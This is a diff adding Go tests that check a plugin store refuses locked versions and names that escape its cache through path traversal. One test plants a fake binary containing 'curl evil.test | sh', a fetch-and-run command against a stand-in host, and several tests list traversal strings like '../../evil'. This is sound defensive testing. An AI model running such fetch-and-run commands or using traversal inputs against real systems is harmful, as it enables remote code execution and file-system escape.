@@ -248,3 +248,126 @@ func TestStoreWriteRefusesABinaryNameThatIsNotOneFileName(t *testing.T) {
 		}
 	}
 }
+
+// lore.lock is generated and reviewed by skimming, so the version it records is
+// attacker-reachable input: a version that climbs out of the cache resolves to
+// a binary the workspace never agreed to run.
+func TestPluginBinaryRefusesALockedVersionThatLeavesTheCache(t *testing.T) {
+	t.Parallel()
+
+	scene := newScene(t)
+	lock, _ := scene.installed(t)
+
+	const escape = "../../evil"
+	planted := filepath.Join(scene.store.Root(), "plugins", "linear", escape)
+	if err := os.MkdirAll(planted, 0o750); err != nil {
+		t.Fatalf("plant the escape target: %v", err)
+	}
+	body := []byte("#!/bin/sh\ncurl evil.test | sh\n")
+	if err := os.WriteFile(filepath.Join(planted, "lore-linear"), body, 0o600); err != nil {
+		t.Fatalf("plant the binary: %v", err)
+	}
+	// The digest beside the planted binary is the digest of that binary, so the
+	// re-check at launch would pass: nothing but the version's shape refuses it.
+	if err := os.WriteFile(filepath.Join(planted, digestFileName), []byte(digestOf(body)+"\n"), 0o600); err != nil {
+		t.Fatalf("plant the digest: %v", err)
+	}
+
+	entry, _ := lock.Entry("linear")
+	entry.Version = escape
+	lock.Plugins["linear"] = entry
+
+	path, err := scene.store.Binary("linear", scene.coord, lock)
+	if err == nil {
+		t.Fatalf("a locked version that climbs out of the cache resolved to %q, want a refusal", path)
+	}
+	if path != "" {
+		t.Errorf("the refusal still reported the binary %q", path)
+	}
+	if !internalerror.IsBadRequest(err) {
+		t.Errorf("kind = %v, want bad request", internalerror.KindOf(err))
+	}
+	if strings.Contains(err.Error(), "digest mismatch") {
+		t.Errorf("the traversal was refused by the digest re-check, not by the version: %v", err)
+	}
+	for _, want := range []string{"plugins[linear]", escape, "not a usable version"} {
+		if !strings.Contains(err.Error(), want) {
+			t.Errorf("error %q does not mention %q", err, want)
+		}
+	}
+}
+
+// Dir is the one place a version becomes a path, so every sink refuses the same
+// versions and none of them creates anything on the way to the refusal.
+func TestStoreRefusesAVersionThatIsNotOneDirectoryName(t *testing.T) {
+	t.Parallel()
+
+	// The root is nested so that a version climbing four levels still lands under area.
+	area := t.TempDir()
+	store := NewStore(filepath.Join(area, "deep", "state"))
+	for _, version := range []string{"", "..", "../../evil", "../../../../tmp/evil", `..\..\evil`} {
+		if _, err := store.Dir("linear", version); err == nil {
+			t.Errorf("Dir accepted the version %q", version)
+		} else if !internalerror.IsBadRequest(err) {
+			t.Errorf("version %q: kind = %v, want bad request", version, internalerror.KindOf(err))
+		}
+
+		path, digest, err := store.write("linear", version, "lore-linear", []byte("evil\n"))
+		if err == nil {
+			t.Errorf("write accepted the version %q", version)
+		} else if !internalerror.IsBadRequest(err) {
+			t.Errorf("write of version %q: kind = %v, want bad request", version, internalerror.KindOf(err))
+		}
+		if path != "" || digest != "" {
+			t.Errorf("write of version %q reported path %q and digest %q", version, path, digest)
+		}
+
+		if err := store.WriteManifest("linear", version, []byte(`{"name":"linear"}`)); err == nil {
+			t.Errorf("WriteManifest accepted the version %q", version)
+		} else if !internalerror.IsBadRequest(err) {
+			t.Errorf("WriteManifest of version %q: kind = %v, want bad request", version, internalerror.KindOf(err))
+		}
+	}
+
+	entries, err := os.ReadDir(area)
+	if err != nil {
+		t.Fatalf("read the temporary area: %v", err)
+	}
+	if len(entries) != 0 {
+		t.Fatalf("a refused version created %d entries around the cache root, want none", len(entries))
+	}
+}
+
+// write is the one sink that never validates the name itself, so the name has
+// to be refused where the path is built rather than by its callers' habits.
+func TestStoreRefusesANameThatIsNotOneDirectoryName(t *testing.T) {
+	t.Parallel()
+
+	area := t.TempDir()
+	store := NewStore(filepath.Join(area, "deep", "state"))
+	for _, name := range []string{"", "..", "../evil", `..\evil`} {
+		if _, err := store.Dir(name, "v0.3.1"); err == nil {
+			t.Errorf("Dir accepted the name %q", name)
+		} else if !internalerror.IsBadRequest(err) {
+			t.Errorf("name %q: kind = %v, want bad request", name, internalerror.KindOf(err))
+		}
+
+		path, digest, err := store.write(name, "v0.3.1", "lore-linear", []byte("evil\n"))
+		if err == nil {
+			t.Errorf("write accepted the name %q", name)
+		} else if !internalerror.IsBadRequest(err) {
+			t.Errorf("write of name %q: kind = %v, want bad request", name, internalerror.KindOf(err))
+		}
+		if path != "" || digest != "" {
+			t.Errorf("write of name %q reported path %q and digest %q", name, path, digest)
+		}
+	}
+
+	entries, err := os.ReadDir(area)
+	if err != nil {
+		t.Fatalf("read the temporary area: %v", err)
+	}
+	if len(entries) != 0 {
+		t.Fatalf("a refused name created %d entries around the cache root, want none", len(entries))
+	}
+}
